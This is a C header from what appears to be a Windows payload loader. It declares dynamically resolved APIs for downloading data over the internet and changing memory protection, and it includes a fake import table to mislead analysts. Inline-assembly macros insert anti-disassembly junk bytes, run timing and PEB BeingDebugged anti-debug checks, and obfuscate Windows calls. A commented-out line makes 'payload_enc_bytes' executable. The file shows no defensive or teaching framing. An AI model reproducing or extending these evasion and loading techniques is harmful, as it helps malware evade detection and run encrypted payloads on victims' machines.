#ifndef _LOADER_H
#define _LOADER_H

#include "config.h"

extern void setTrapFlag(void);
extern void stepOverExit(void);
extern void appendByteExit(void);

#ifndef DEBUG
#define FORCE_INLINE __attribute__((always_inline)) inline
#else
#define FORCE_INLINE __cdecl
#endif

// IAT FAKE
#include <objidl.h>
#include <gdiplus.h>
// END

#include <windows.h>
#include "../crypto/aes.h"
#include <signal.h>
#include <wininet.h>
#include <winternl.h>
#include <Memoryapi.h>
#include <errno.h>

#define nullptr NULL

typedef int (WINAPI* MessageBoxWFunc)(
    HWND    hWnd,
    LPCWSTR lpText,
    LPCWSTR lpCaption,
    UINT    uType
    );
typedef NTSTATUS(NTAPI* pLdrLoadDll) (
    PWCHAR PathToFile,
    ULONG Flags,
    PUNICODE_STRING ModuleFileName,
    PHANDLE ModuleHandle
    );

typedef unsigned int (*payload)(void**);
typedef WINBOOL (NTAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef VOID (WINAPI*pGetSystemTime)(void);
typedef HANDLE (WINAPI*pCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef WINBOOL (WINAPI*pWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
typedef WINBOOL (WINAPI*pCloseHandle)(HANDLE hObject);
typedef HINTERNET (WINAPI*pInternetOpenW)(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags);
typedef HINTERNET (WINAPI*pInternetOpenUrlA)(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
typedef WINBOOL (WINAPI*pInternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef WINBOOL (WINAPI*pInternetCloseHandle)(HINTERNET hInternet);
typedef DWORD (WINAPI*pGetLastError)(void);
typedef VOID (WINAPI*pExitProcess)(UINT uExitCode);
typedef HDESK (WINAPI*pCreateDesktopW)(LPCWSTR lpszDesktop, LPCWSTR lpszDevice, LPDEVMODEW pDevmode, DWORD dwFlags, ACCESS_MASK dwDesiredAccess, LPSECURITY_ATTRIBUTES lpsa);
typedef WINBOOL (WINAPI*pSetThreadDesktop)(HDESK hDesktop);
typedef HANDLE (WINAPI*pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef WINBOOL (WINAPI*pCloseDesktop)(HANDLE hObject);
typedef VOID (NTAPI*pRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

#define TOMFOOLERY asm volatile(\
        "call appendByte2Rip\n\t"\
        ".byte 0x9a\n\t"\
    );

// DO NOT CALL BEFORE FETCHING _GetSystemTime
#define RECORD_TIME asm volatile(\
        "call pushTime\n\t"\
        ::: "%rax","%rcx","%r11","%rdi"\
);


#define CHECK_TIME asm volatile(\
        "call loadTime\n\t"\
        ".byte 0x9a\n\t"\
        ::: "%rax","%rcx","%r11","%rdi"\
);

#define RANDOM_BYTE asm volatile(\
    ".byte 0x9a"\
);

#define SHORT_JMP asm volatile(\
    ".word 0x01eb\n\t"\
    ".byte 0x9a\n\t"\
);

#define OBFUSCATE_WIN_CALL asm volatile(\
    "call callSecretWIN\n\t"\
    ".byte 0x9a\n\t"\
);


/*
mov     rax, gs:0x60
movzx   eax, byte ptr [rax+2]
test eax, eax
*/
#define CHECK_DBG asm volatile(\
    ".long 0x048b4865\n\t"\
    ".long 0x00006025\n\t"\
    ".long 0x40b60f00\n\t"\
    ".long 0x75c08502\n\t"\
    ".byte 0x01\n\t"\
    ::: "%rax"\
);

// #define DYNAMIC_RETURN asm volatile(\
//     ".byte 0xe8\n\t"\
//     ".word 0x0002\n\t"\
//     ".word 0x0000\n\t"\
//     ".word 0x8e7d\n\t"\
//     "pop %%rax\n\t"\
//     "add $16, %%rax\n\t"\
//     "xor $0xf8145, %%r9\n\t"\
//     "push %%rax\n\t"\
//     "ret\n\t"\
//     ".byte 0x9a\n\t"\
//     ::: "%rax","%r9"\
// )
// VirtualProtect(execute_me, sizeof(payload_enc_bytes), PAGE_EXECUTE_READWRITE, junk);
// #define VIRT_PROTECT_OBF(data, size, perms, junk_ptr) asm volatile(\
//         "mov %0, %%rcx\n\t"\
//         "mov %1, %%edx\n\t"\
//         "mov %2, %%r8d\n\t"\
//         "mov %3, %%r9\n\t"\
//         "call callSecretWIN\n\t"\
//         ".byte 0x9a\n\t"\
//         "call VirtualProtect\n\t"\
//         : : "r" (data), "i" (size), "i" (perms), "r" (junk_ptr) : "%rdi"\
// );

HMODULE _LoadLibrary(LPCWSTR lpFileName);
HMODULE _GetModuleHandle(LPCWSTR lModuleName);
FARPROC _GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
FARPROC _GetProcAddressNative(LPCSTR lpProcName);
#endif